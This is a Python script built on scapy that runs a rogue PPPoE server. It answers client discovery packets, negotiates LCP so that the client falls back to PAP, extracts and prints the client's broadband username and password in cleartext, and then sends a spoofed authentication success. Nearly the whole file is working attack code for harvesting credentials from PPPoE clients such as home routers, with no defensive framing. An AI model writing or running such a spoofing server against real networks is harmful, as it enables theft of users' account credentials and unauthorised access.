# coding:utf-8

'''
@author Akkuman
@date 2019.5.11
@update 2019.5.14
'''

import struct
import random
import copy
import binascii
import socket

from scapy.layers.ppp import *
import scapy.all as scapy

MAC_ADDRESS = "0a:0a:0a:0a:0a:0a"
# 会话 id，可自定义
SESSION_ID = 0x0005


# 获取一个随机的 mac 地址
def get_mac_address():
    maclist = []
    for i in range(6):
        randstr = "".join(random.sample("0123456789abcdef",2))
        maclist.append(randstr)
    return ":".join(maclist)

# 获取本机物理网卡 ip 地址的 bytes 值
def get_host_ip_bytes():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
        
    bytes_ip = b''
    for i in ip.split('.'):
        bytes_ip += struct.pack('!B', int(i))
    
    return bytes_ip
    
class PPPoEServer(object):
    filter = "pppoed or pppoes"
    
    def __init__(self):
        self.ipaddr_bytes = get_host_ip_bytes()
        self.clientMap = {}
        self.magic_num = b'\x25\x5f\xc5\xcb'
        self.username = None
        self.password = None

    # 开始监听
    def start(self):
        scapy.sniff(filter=self.filter, prn=self.filterData)

    # 过滤pppoe数据
    def filterData(self, pkt):
        if hasattr(pkt, "type"):
            _type2Method = {
                #发现阶段
                0x8863: {
                    "code": {
                        # PADI
                        0x09: self.send_pado_packet,
                        # PADR
                        0x19: self.send_pads_packet
                    }
                },
                #会话阶段
                0x8864:{
                    "proto":{
                        # LCP 链路处理
                        0xc021: self.send_lcp,
                        # PAP 协议处理
                        0xc023: self.handle_pap,
                        # IPCP 协议处理
                        0x8021: self.handle_ipcp
                    }
                }
            }
            if pkt.type in _type2Method:
                _nMethod = _type2Method[pkt.type]
                for k, v in _nMethod.items():
                    _nVal = getattr(pkt, k)
                    if _nVal in _nMethod[k]:
                        handle_func = _nMethod[k][_nVal]
                        handle_func(pkt)

    #处理 PPP LCP 请求
    def send_lcp(self, pkt):
        # 初始化 clientMap
        if not self.clientMap.get(pkt.src):
            print("----------会话阶段----------")
            self.clientMap[pkt.src] = {"req": 0, "ack": 0}
            
        # 处理 LCP-Configuration-Req 请求
        if bytes(pkt.payload)[8] == 0x01:
            # 第一次 LCP-Configuration-Req 请求返回 Rej 响应包
            if self.clientMap[pkt.src]['req'] == 0:
                self.clientMap[pkt.src]['req'] += 1
                print("第 %d 次收到LCP-Config-Req" % self.clientMap[pkt.src]["req"])
                print("处理Req请求，发送LCP-Config-Rej包")
                self.send_lcp_reject_packet(pkt)
                print("发送LCP-Config-Req包")
                self.send_lcp_req_packet(pkt)
            # 后面的 LCP-Configuration-Req 请求均返回 Ack 响应包
            else:
                self.clientMap[pkt.src]['req'] += 1
                print("第 %d 次收到LCP-Config-Req" % self.clientMap[pkt.src]["req"])
                print("处理Req请求，发送LCP-Config-Ack包")
                self.send_lcp_ack_packet(pkt)

        # 处理 LCP-Configuration-Rej 请求
        elif bytes(pkt.payload)[8] == 0x04:
            print("处理Rej请求，发送LCP-Config-Req包")
            self.send_lcp_req_packet(pkt)

        # 处理 LCP-Configuration-Ack 请求
        elif bytes(pkt.payload)[8] == 0x02:
            self.clientMap[pkt.src]['ack'] += 1
            print("第 %d 次收到LCP-Config-Ack" % self.clientMap[pkt.src]["ack"])
        else:
            pass
    
    # IPCP 协议处理
    def handle_ipcp(self, pkt):
        payload = bytes(pkt.payload)
        # req 请求处理
        if payload[8] == 0x01:
            # 当 Req 请求的 options 有 ip dns 之外的字段，发送 rej
            if len(payload[12:]) != 18:
                self.send_ipcp_rej_packet(pkt)
            # 当 Req 请求的 ip 以 0 开头时(0.0.0.0)，发送 nak 开始分配 ip
            elif payload[14] == 0x00:
                print('IPCP Nak 开始分配 ip')
                self.send_ipcp_nak_packet(pkt)
            else:
                print('IPCP Ack 确认分配 ip')
                self.send_ipcp_ack_packet(pkt)
    
    # 发送 IPCP-Configuration-Rej
    def send_ipcp_rej_packet(self, pkt):
        code = 0x04
        identifier = bytes(pkt.payload)[9]
        options = b'\x82\x06\x00\x00\x00\x00\x84\x06\x00\x00\x00\x00'
        length = len(options) + 4
        _payload = struct.pack('!BBH', code, identifier, length) + options
        _pkt = Ether(src=pkt.dst, dst=pkt.src, type=0x8864) / PPPoED(version=1, type=1, code=0x00, sessionid=SESSION_ID) / PPP(proto=0x8021) / _payload
        scapy.sendp(_pkt)
    
    # 静态分配发送 IPCP-Configuration-Req
    def send_ipcp_req_static_packet(self, pkt):
        code = 0x01
        identifier = 0x01
        options = bytes(pkt.payload)[12:]
        ipcp_len = len(options) + 4
        _payload = struct.pack('!BBH', code, identifier, ipcp_len) + options
        _pkt = Ether(src=pkt.dst, dst=pkt.src, type=0x8864) / PPPoED(version=1, type=1, code=0x00, sessionid=SESSION_ID) / PPP(proto=0x8021) / _payload
        scapy.sendp(_pkt)
    
    # 动态分配发送 IPCP-Configuration-Req
    def send_ipcp_req_dynamic_packet(self, pkt):
        code = 0x01
        identifier = 0x01
        options = b'\x03\x06' + self.ipaddr_bytes[:2] + b'\x01\x01'
        ipcp_len = len(options) + 4
        _payload = struct.pack('!BBH', code, identifier, ipcp_len) + options
        _pkt = Ether(src=pkt.dst, dst=pkt.src, type=0x8864) / PPPoED(version=1, type=1, code=0x00, sessionid=SESSION_ID) / PPP(proto=0x8021) / _payload
        scapy.sendp(_pkt)
        
    # 发送 IPCP-Configuration-Nak 准备分配 ip
    def send_ipcp_nak_packet(self, pkt):
        code = 0x03
        identifier = bytes(pkt.payload)[9]
        options = b'\x03\x06' + self.ipaddr_bytes + b'\x81\x06\xca\x67\x2c\x96' + b'\x83\x06\xca\x67\x18\x44'
        length = len(options) + 4
        _payload = struct.pack('!BBH', code, identifier, length) + options
        _pkt = Ether(src=pkt.dst, dst=pkt.src, type=0x8864) / PPPoED(version=1, type=1, code=0x00, sessionid=SESSION_ID) / PPP(proto=0x8021) / _payload
        scapy.sendp(_pkt)
    
    # 发送 IPCP-Configuration-Ack 确认分配 ip
    def send_ipcp_ack_packet(self, pkt):
        code = 0x02
        identifier = bytes(pkt.payload)[9]
        options = b'\x03\x06' + self.ipaddr_bytes + b'\x81\x06\xca\x67\x2c\x96' + b'\x83\x06\xca\x67\x18\x44'
        ipcp_len = len(options) + 4
        _payload = struct.pack('!BBH', code, identifier, ipcp_len) + options
        _pkt = Ether(src=pkt.dst, dst=pkt.src, type=0x8864) / PPPoED(version=1, type=1, code=0x00, sessionid=SESSION_ID) / PPP(proto=0x8021) / _payload
        scapy.sendp(_pkt)
    
    # 解析pap账号密码
    def handle_pap(self, pkt):
        # pap-req
        _payLoad = bytes(pkt.payload)
        if _payLoad[8] == 0x01:
            print("获取账号信息...")
            _nUserLen = int(_payLoad[12])
            _nPassLen = int(_payLoad[13 + _nUserLen])
            _userName = _payLoad[13:13 + _nUserLen]
            _passWord = _payLoad[14 + _nUserLen:14 + _nUserLen + _nPassLen]
            self.username = _userName.decode('utf-8')
            self.password = _passWord.decode('utf-8')
            print("账户: %s\n密码: %s" % (self.username, self.password))
            #self.send_pap_authreject(pkt)
            #self.send_lcp_end_packet(pkt)
            self.send_pap_authack(pkt)
            if pkt.src in self.clientMap:
                del self.clientMap[pkt.src]

            print("欺骗完毕....")
    
    # 发送 PAP 通过认证
    def send_pap_authack(self, pkt):
        code = 0x02
        identifier = bytes(pkt.payload)[9]
        message = '0;User(%s) Authenticate OK, Request Accept by hb.cn' % self.username[7:-5]
        message_len = len(message)
        pap_len = message_len + 5
        _payload = struct.pack('!BBHB', code, identifier, pap_len, message_len) + message.encode()
        _pkt = Ether(src=pkt.dst, dst=pkt.src, type=0x8864) / PPPoED(version=1, type=1, code=0x00, sessionid=SESSION_ID) / PPP(proto=0xc023) / _payload
        scapy.sendp(_pkt)

    # 发送 PAP 拒绝验证
    def send_pap_authreject(self, pkt):
        _payload = b'\x03' + bytes(pkt.payload)[9:10] + b'\x00\x06\x01\x00'
        _pkt = Ether(src=pkt.dst, dst=pkt.src, type=0x8864) / PPPoED(version=1, type=1, code=0x00, sessionid=SESSION_ID) / PPP(proto=0xc023) / _payload
        scapy.sendp(_pkt)

    # 发送lcp-config-ack回执包
    def send_lcp_ack_packet(self, pkt):
        _payload = bytes(pkt.payload)[:8] + b'\x02' + bytes(pkt.payload)[9:]
        _pkt = Ether(src=pkt.dst, dst=pkt.src, type=0x8864) / _payload
        scapy.sendp(_pkt)

    #发送lcp-config-reject回执包
    def send_lcp_reject_packet(self, pkt):
        code = 0x04
        identifier = bytes(pkt.payload)[9]
        options = bytes(pkt.payload)[22:]
        length = len(options) + 4
        _payload = struct.pack('!BBH', code, identifier, length) + options
        _pkt = Ether(src=pkt.dst, dst=pkt.src, type=0x8864) / PPPoED(version=1, type=1, code=0x00, sessionid=SESSION_ID) / PPP(proto=0xc021) / _payload
        scapy.sendp(_pkt)

    #发送lcp-config-req回执包
    def send_lcp_req_packet(self, pkt):
        # 服务端声明使用PAP认证
        auth_proto = b'\x01\x04\x05\xd4\x03\x04\xc0\x23\x05\x06\x5e\x63\x0a\xb8'
        _payload = b'\x01\x01\x00\x12' + auth_proto
        _pkt = Ether(src=pkt.dst, dst=pkt.src, type=0x8864) / PPPoED(version=1, type=1, code=0x00, sessionid=SESSION_ID) / PPP(proto=0xc021) / _payload
        scapy.sendp(_pkt)
    
    # 发送 lcp-echo-req包
    def send_lcp_echo_request(self, pkt):
        _payload = b'\x09\x00\x00\x08' + b'\x25\x5f\xc5\xcb'
        lcp_req = Ether(src=pkt.dst, dst=pkt.src, type=0x8864) / PPPoED(version=1, type=1, code=0x00, sessionid=SESSION_ID) / PPP(proto=0xc021) / _payload
        scapy.sendp(lcp_req)
    
    #发送lcp-termination会话终止包
    def send_lcp_end_packet(self, pkt):
        _payload = b'\x05\x02\x00\x04'
        _pkt = Ether(src=pkt.dst, dst=pkt.src, type=0x8864) / PPPoE(version=0x1, type=0x1, code=0x00, sessionid=SESSION_ID) / PPP(proto=0xc021) / _payload
        scapy.sendp(_pkt)

    #发送PADS回执包
    def send_pads_packet(self, pkt):
        print("PADR阶段开始,发送PADS...")
        #寻找客户端的Host_Uniq
        _host_Uniq = self.padi_find_hostuniq(pkt.payload)
        _payload = b'\x01\x01\x00\x00'
        if _host_Uniq:
            _payload += _host_Uniq

        pkt.sessionid =  SESSION_ID
        sendpkt = Ether(src=MAC_ADDRESS, dst=pkt.src, type=0x8863) / PPPoED(version=1, type=1, code=0x65, sessionid=pkt.sessionid, len=len(_payload)) / _payload
        scapy.sendp(sendpkt)

    #发送PADO回执包
    def send_pado_packet(self, pkt):
        print("PADI阶段开始,发送PADO...")
        # 寻找客户端的Host_Uniq
        _host_Uniq = self.padi_find_hostuniq(pkt.payload)
        _payload = b'\x01\x02\x00\x07akkuman\x01\x01\x00\x00'
        if _host_Uniq:
            _payload += _host_Uniq
        # PADO 回执包的 sessoinid 为 0x0000
        pkt.sessionid =  getattr(pkt, 'sessionid', 0x0000)
        sendpkt = Ether(src=MAC_ADDRESS, dst=pkt.src, type=0x8863) / PPPoED(version=1, type=1, code=0x07, sessionid=pkt.sessionid, len=len(_payload)) / _payload
        scapy.sendp(sendpkt)


    #寻找客户端发送的Host-Uniq
    def padi_find_hostuniq(self, payload):
        _key = b'\x01\x03'
        payload = bytes(payload)
        if _key in payload:
            _nIdx = payload.index(_key)
            _nLen = struct.unpack("!H", payload[_nIdx + 2:_nIdx + 4])[0]
            _nData = payload[_nIdx + 2:_nIdx + 4 + _nLen]
            return _key + _nData
        return


if __name__ == "__main__":
    MAC_ADDRESS = get_mac_address()
    n = PPPoEServer()
    n.start()
